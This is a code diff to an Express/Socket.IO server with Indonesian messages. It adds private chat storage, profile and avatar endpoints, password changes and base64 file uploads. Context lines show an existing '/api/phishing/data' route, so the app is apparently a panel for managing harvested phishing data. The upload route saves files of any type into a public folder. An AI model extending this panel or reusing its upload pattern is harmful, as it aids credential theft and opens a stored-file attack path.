@@ -18,7 +18,8 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-app.use(express.json());
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ limit: '10mb', extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 const USERS_FILE = './users.json';
@@ -147,6 +148,7 @@ app.post('/api/users', authMiddleware, ownerOnly, (req, res) => {
     username,
     password: hashPw(password),
     role,
+    avatar: '',
     createdAt: Date.now(),
     createdBy: req.user.username
   };
@@ -287,6 +289,28 @@ function getSenderList() {
 }
 
 let chatHistory = loadChat();
+
+
+// ===== CHAT PRIVATE =====
+let chatPrivateHistory = [];
+try {
+  if (fs.existsSync(CHAT_PRIVATE_FILE)) {
+    chatPrivateHistory = JSON.parse(fs.readFileSync(CHAT_PRIVATE_FILE, 'utf8'));
+  }
+} catch (e) { chatPrivateHistory = []; }
+
+function saveChatPrivate() {
+  try {
+    const recent = chatPrivateHistory.slice(-1000);
+    fs.writeFileSync(CHAT_PRIVATE_FILE, JSON.stringify(recent, null, 2));
+  } catch (e) { console.log('saveChatPrivate err:', e.message); }
+}
+
+function getChatKey(userA, userB) {
+  // Normalize: alfabetik biar sama dari dua arah
+  const arr = [userA, userB].sort();
+  return arr[0] + '|' + arr[1];
+}
 
 io.on('connection', (socket) => {
   console.log('[IO] Client:', socket.id);
@@ -1057,6 +1081,88 @@ app.delete('/api/phishing/data', authMiddleware, (req, res) => {
   try {
     savePhishData([]);
     res.json({ ok: true, msg: 'Data dihapus' });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+
+// ===== CHAT PRIVATE HTTP FALLBACK =====
+
+
+
+
+
+
+
+// ===== USER PROFILE + SETTINGS =====
+app.get('/api/profile', authMiddleware, (req, res) => {
+  try {
+    res.json({
+      ok: true,
+      username: req.user.username,
+      role: req.user.role,
+      avatar: req.user.avatar || ''
+    });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+app.get('/api/profile/:username', authMiddleware, (req, res) => {
+  try {
+    const users = loadUsers();
+    const u = users[req.params.username];
+    if (!u) return res.json({ ok: false, msg: 'User tidak ditemukan' });
+    res.json({ ok: true, username: u.username, role: u.role, avatar: u.avatar || '' });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+app.post('/api/profile/avatar', authMiddleware, (req, res) => {
+  try {
+    const { avatar } = req.body || {};
+    if (!avatar) return res.json({ ok: false, msg: 'Avatar kosong' });
+    const users = loadUsers();
+    users[req.user.username].avatar = String(avatar).slice(0, 7000000);
+    saveUsers(users);
+    res.json({ ok: true, msg: 'Foto profil diupdate' });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+app.post('/api/profile/password', authMiddleware, (req, res) => {
+  try {
+    const { oldPassword, newPassword } = req.body || {};
+    if (!oldPassword || !newPassword) return res.json({ ok: false, msg: 'Lengkapi semua field' });
+    if (newPassword.length < 6) return res.json({ ok: false, msg: 'Sandi minimal 6 karakter' });
+    const users = loadUsers();
+    const u = users[req.user.username];
+    if (u.password !== hashPw(oldPassword)) return res.json({ ok: false, msg: 'Sandi lama salah' });
+    u.password = hashPw(newPassword);
+    saveUsers(users);
+    res.json({ ok: true, msg: 'Sandi berhasil diubah' });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+
+// Upload file/foto
+const UPLOAD_DIR2 = path.join(__dirname, 'public', 'chat-uploads');
+if (!fs.existsSync(UPLOAD_DIR2)) fs.mkdirSync(UPLOAD_DIR2, { recursive: true });
+
+app.post('/api/chat-private/upload', authMiddleware, (req, res) => {
+  try {
+    const { filename, data } = req.body || {};
+    if (!filename || !data) return res.json({ ok: false, msg: 'Data kosong' });
+    const safeName = Date.now() + '_' + filename.replace(/[^a-zA-Z0-9._-]/g, '_');
+    const filePath = path.join(UPLOAD_DIR2, safeName);
+    const buf = Buffer.from(data, 'base64');
+    fs.writeFileSync(filePath, buf);
+    res.json({ ok: true, url: '/chat-uploads/' + safeName, size: buf.length, filename: safeName });
   } catch (e) {
     res.json({ ok: false, msg: e.message });
   }
